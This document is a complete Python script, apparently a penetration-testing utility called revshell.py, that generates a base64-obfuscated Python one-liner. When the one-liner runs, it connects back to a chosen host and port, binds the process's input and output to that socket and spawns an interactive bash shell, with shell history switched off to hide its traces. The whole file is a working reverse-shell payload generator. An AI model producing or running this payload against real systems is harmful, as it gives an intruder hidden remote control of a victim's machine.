#!/usr/bin/env python3

import base64
from colorama import Fore, Style
import sys

def printer(ip, port, version=''):
    CODE = '''import os
import pty
import socket
import sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('{}', {}))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
os.putenv("HISTFILE", '/dev/null')
pty.spawn("/bin/bash")'''.format(ip, port)
    print(Style.BRIGHT + Fore.RED + "python{} -c \"import base64;exec(compile(base64.b64decode(b'{}'),'<string>','exec'))\"".format(version, str(base64.b64encode(CODE.encode("utf-8"))).split('\'')[1]))

if __name__ == '__main__':

    if len(sys.argv)  == 3:
         printer(sys.argv[1], sys.argv[2])
    elif len(sys.argv) == 4:
        printer(sys.argv[1], sys.argv[2], sys.argv[3])
    else:
        print(Style.BRIGHT + Fore.BLUE + "Usage: revshell.py <LHOST> <LPORT> [PYTHON_VERSION]")
        raise SystemExit
